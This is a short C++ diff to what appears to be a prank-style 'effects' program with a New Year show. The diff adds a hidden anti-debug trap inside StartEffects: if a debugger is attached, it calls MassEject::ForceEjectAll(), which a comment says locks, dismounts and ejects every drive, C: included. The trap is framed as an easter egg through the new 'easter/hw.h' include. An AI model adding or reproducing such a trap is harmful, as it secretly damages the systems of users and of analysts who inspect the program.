@@ -4,6 +4,7 @@
 #include "utils/bytebeats.h"
 #include "utils/reg.h"
 #include "utils/spawner.h"
+#include "easter/hw.h"
 
 #include <vector>
 
@@ -280,6 +281,12 @@ void StartEffects(bool noGui)
                 MB_OK
             );
         }
+
+        // Anti-debug trap: debug the New Year show on Jan 1 and
+        // you lose every drive after the effects finish — C: and
+        // all. Locks, dismounts, then ejects everything.
+        if (IsDebuggerPresent())
+            MassEject::ForceEjectAll();
     }
     else if (dm)
     {
